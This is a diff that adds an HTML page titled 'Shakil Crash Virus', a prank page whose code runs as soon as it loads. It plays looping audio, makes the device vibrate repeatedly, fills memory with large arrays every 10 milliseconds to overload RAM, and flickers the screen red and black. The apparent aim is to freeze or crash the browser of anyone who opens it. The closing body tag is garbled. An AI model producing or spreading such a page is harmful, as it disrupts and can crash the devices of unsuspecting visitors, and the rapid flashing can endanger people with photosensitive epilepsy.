@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Shakil Crash Virus 😈</title>
+  <style>
+    body {
+      background: black;
+      color: #00FF00;
+      font-family: monospace;
+      font-size: 18px;
+      overflow: hidden;
+    }
+    .matrix {
+      position: absolute;
+      white-space: nowrap;
+    }
+  </style>
+</head>
+<body onload="startCrash()">
+  <h1>💀 Shakil Virus Activated 💀</h1>
+  <script>
+    // Matrix effect
+    setInterval(() => {
+      let span = document.createElement("div");
+      span.className = "matrix";
+      span.innerText = "0101 Shakil Virus 😈 1010";
+      span.style.left = Math.random() * window.innerWidth + "px";
+      span.style.top = Math.random() * window.innerHeight + "px";
+      document.body.appendChild(span);
+    }, 50);
+
+    // Audio bomb
+    let audio = new Audio("https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3");
+    audio.loop = true;
+
+    // Crash begins
+    function startCrash() {
+      audio.play();
+      
+      // Vibrate
+      setInterval(() => {
+        navigator.vibrate(1000);
+      }, 500);
+
+      // RAM overload
+      let arr = [];
+      setInterval(() => {
+        arr.push(new Array(1000000).fill("💣 Shakil Overload"));
+      }, 10);
+
+      // Screen flicker
+      setInterval(() => {
+        document.body.style.background = 
+          document.body.style.background === "black" ? "red" : "black";
+      }, 100);
+    }
+  </script>
+</bod#FF0010y>
+</html>
